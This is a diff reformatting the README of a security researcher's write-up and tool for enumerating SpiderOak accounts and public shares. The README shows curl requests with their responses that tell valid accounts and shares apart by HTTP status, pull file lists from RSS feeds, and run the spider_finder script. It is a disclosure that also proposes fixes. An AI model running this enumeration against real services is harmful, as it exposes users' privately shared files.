@@ -1,7 +1,6 @@
-Spidering SpiderOak
-===================
+# Spidering SpiderOak
 
-Copyright(c) 2013, Robin Wood <robin@digininja.org>
+Copyright(c) 2018, Robin Wood <robin@digi.ninja>
 
 About two years ago I did some research on enumerating the content of public
 shares on both Amazon_Buckets and Mobile_Me. At the start of 2012 I started
@@ -22,8 +21,7 @@ A week or so ago Rapid 7 published their research on Amazon Buckets and with
 the interest it generated I thought I'd dig out the SpiderOak work and see if
 it still worked, it does, so here it is...
 
-How It Works
-============
+## How It Works
 
 The way the enumeration works is by checking HTTP return values to identify
 valid accounts then looking for RSS feeds to find valid shares. It goes like
@@ -32,6 +30,7 @@ this.
 If you request a share on an account that exists, even if the share doesn't
 exist, you get a 200 returned:
 
+```
 $ curl -I https://spideroak.com/browse/share/digi_public/not_exist
 HTTP/1.1 200 OK
 Server: nginx/0.7.64
@@ -43,9 +42,11 @@ Content-Length: 6813
 X-Frame-Options: SAMEORIGIN
 Strict-Transport-Security: max-age=8640000; includeSubDomains
 Set-Cookie: uid=AAAAKlFcqe69ciDRBEYWAg==; expires=Thu, 03-Apr-14 22:15:10 GMT; path=/
+```
 
 But on an account which doesn't exist you get a 404:
 
+```
 $ curl -I https://spideroak.com/browse/share/digi_public_not_exist/not_exist
 HTTP/1.1 404 Not Found
 Server: nginx/0.7.64
@@ -55,6 +56,7 @@ Content-Length: 1696
 Connection: keep-alive
 Vary: Accept-Encoding
 Set-Cookie: uid=AAAAKlFcqia9ciDRBEaQAg==; expires=Thu, 03-Apr-14 22:16:06 GMT; path=/
+```
 
 So you can now run through a list of user names and score a hit for any 200's
 you get back.
@@ -62,16 +64,21 @@ you get back.
 The next step is to enumerate shares, to do this request the share you want to
 check and search the page that is returned for an RSS link in its header.
 
+```
 curl -s https://spideroak.com/browse/share/digi_public/does_exist|grep RSS
 <link rel="alternate" type="application/rss+xml" title="RSS" href="/share/XXXWO2K7OB2WE3DJMM/does_exist/?rss" />
+```
 
+```
 curl -s https://spideroak.com/browse/share/digi_public/not_exist|grep RSS
 <link rel="alternate" type="application/rss+xml" title="RSS" href="/share/XXXWO2K7OB2WE3DJMM/not_exist/?rss" />
+```
 
 All shares, whether they exist or not, have an RSS link in the header but if
 you then check the RSS link you get a 200 for valid shares but 404 for shares
 which don't exist.
 
+```
 $ curl -I https://spideroak.com/share/XXXWO2K7OB2WE3DJMM/does_exist/?rss
 HTTP/1.1 200 OK
 Server: nginx/0.7.64
@@ -83,7 +90,9 @@ X-Frame-Options: SAMEORIGIN
 Strict-Transport-Security: max-age=8640000; includeSubDomains
 Set-Cookie: uid=AAAAKlFcrZ21fSDQBCdjAg==; expires=Thu, 03-Apr-14 22:30:53 GMT;
 path=/
+```
 
+```
 $ curl -I https://spideroak.com/share/XXXWO2K7OB2WE3DJMM/not_exist/?rss
 HTTP/1.1 404 Not Found
 Server: nginx/0.7.64
@@ -95,12 +104,14 @@ Vary: Accept-Encoding
 Content-length: 108
 Set-Cookie: uid=AAAAKlFcrba1fSDQBCd8Ag==; expires=Thu, 03-Apr-14 22:31:18 GMT;
 path=/
+```
 
 So now you can spot valid shares.
 
 If you look at the RSS feed that you get from a valid share it contains a list
 of all the files in the share:
 
+```
 $ curl https://spideroak.com/share/XXXWO2K7OB2WE3DJMM/does_exist/?rss
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
@@ -142,12 +153,12 @@ $ curl https://spideroak.com/share/XXXWO2K7OB2WE3DJMM/does_exist/?rss
 </entry>
 
 </feed>
+```
 
 And that is it, you can read through the RSS file and generate a list of files
 ready to download.
 
-What Did I Find?
-================
+## What Did I Find?
 
 Well, unfortunately not that much although I didn't search that hard. I started
 with a list of 2268 common names, I ran those through and found 615 valid
@@ -166,8 +177,7 @@ account being valid but didn't get any shares. Just because the names match
 companies doesn't mean they belong to them but could be useful information if a
 company you are testing happens to have a successful match.
 
-How Could SpiderOak Fix This?
-=============================
+## How Could SpiderOak Fix This?
 
 I believe there are a few things which need doing to fix this problem. The
 first is to fix the actual vulnerability, requesting a share which doesn't
@@ -192,8 +202,7 @@ any useful data. Add to this some alerting, and someone watching the alerts,
 and human intervention could also help if someone persistent did try to bypass
 the lockout.
 
-Are Shares Secure?
-==================
+## Are Shares Secure?
 
 While playing with all this I was thinking about how sharing works and how it
 ties in with the privacy_policy SpiderOak display on their site - 
@@ -230,8 +239,7 @@ I know that I'm assuming things here and could be completely wrong but others
 have also mentioned their distrust of the sharing model and the fact that its
 entire security is based on what comes down to a folder name.
 
-Installation/Usage
-==================
+## Installation/Usage
 
 The tarball comes with the spider_finder script and my list of common folder
 names, you have to provide your own list of account names.
@@ -250,10 +258,11 @@ folder list you can use the --valid-accounts flag to tell the script that it
 doesn't need to check if the account exists before checking for shares.
 
 Sample usage:
+```
 $ ./spider_finder.rb --log-file first_run.log common_names common_folders.txt
+```
 
-Do I Still Use SpiderOak?
-=========================
+## Do I Still Use SpiderOak?
 
 I guess after all this you would assume that I no longer use SpiderOak but you
 would be wrong. Overall I like their ideas and their principals, even if they
@@ -263,8 +272,7 @@ move to Dropbox but they have (had?) more serious problems. I could move to
 another competitor but I would end up wondering how they worked and probably
 end up analysing them as well and finding different issues.
 
-Feedback
-========
+## Feedback
 
 If you find any bugs or have comments then please get in touch, my details are
 on the contact page.
